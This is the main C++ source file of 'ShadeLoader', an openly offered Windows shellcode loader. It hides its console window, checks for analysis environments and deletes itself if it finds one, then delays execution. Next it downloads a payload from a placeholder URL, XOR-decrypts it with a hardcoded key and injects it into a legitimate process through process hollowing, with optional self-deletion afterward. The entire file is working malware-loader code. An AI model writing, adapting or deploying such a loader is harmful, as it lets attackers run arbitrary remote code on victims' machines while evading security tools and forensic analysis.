#define NOMINMAX
#define _CRT_SECURE_NO_WARNINGS

#include "self_delete.h"
#include "protection.h"
#include "encryption.h"
#include "shellcode_downloader.h"
#include "process_hollowing.h"
#include "config.h" 
#include <fstream>
#include <iomanip>
#include <algorithm>
#include <windows.h> 

// ShadeLoader - By Vasco0x4
// Repository: https://github.com/Vasco0x4
// Developed with Visual Studio 2022

/*
ShadeLoader is a shellcode loader that utilizes process hollowing and XOR encryption techniques to download, decrypt, and inject shellcode into a legitimate process..
*/

// Print first 64 bytes
void print_bytes(const unsigned char* data, size_t len) {
#if ENABLE_DEBUG
    for (size_t i = 0; i < len; ++i) {
        if (i % 16 == 0) std::cout << "\n";
        std::cout << std::hex << std::setw(2) << std::setfill('0') << (int)data[i] << " ";
    }
    std::cout << std::dec << std::endl;
#endif
}

int main(int argc, char* argv[]) {
    HWND hWnd = GetConsoleWindow();
    if (ENABLE_DEBUG && hWnd) {
        ShowWindow(hWnd, SW_SHOW);
    }
    else {
        ShowWindow(hWnd, SW_HIDE);
    }

    DEBUG_PRINT("[+] Starting");

#if PROTECTION
    if (protection()) {
        DEBUG_PRINT("[-] Suspicious environment detected");
        self_delete();
        return 1;
    }
#endif

    delay_execution();
#if SUSPEND_DOWNLOAD
    Sleep(0); //  Sleeping time before get shellcode 
    DEBUG_PRINT("[+] Delay execution complete.");
#endif

    const wchar_t* url = L"https://example.com/raw/shellcode.bin"; // Replace with your URL
    size_t payload_size = 0;
    unsigned char* obfuscated_payload = download_payload(url, &payload_size);

    if (!obfuscated_payload || payload_size == 0) {
        DEBUG_PRINT("[-] Failed to download payload");
        return 1;
    }
    DEBUG_PRINT("[+] Payload downloaded successfully. Size: " << payload_size << " bytes.");

    unsigned char key[] = "ShadeLoader";  // Replace with your key
    size_t key_len = sizeof(key) - 1;

    xor_encrypt_decrypt(obfuscated_payload, payload_size, key, key_len);

    DEBUG_PRINT("[+] Decrypted payload : obfuscated_payload", std::min(payload_size, static_cast<size_t>(64)));

    // Inject shellcode into the target process
    if (!InjectShellcode(obfuscated_payload, payload_size)) {
        DEBUG_PRINT("[-] Shellcode injection failed");
        free(obfuscated_payload);
        return 1;
    }
    DEBUG_PRINT("[+] Shellcode injected successfully");

#if AUTODESTRUCT
    self_delete();
#endif

    // Cleanup
    free(obfuscated_payload);
    DEBUG_PRINT("[+] Cleanup complete");

    return 0;
}
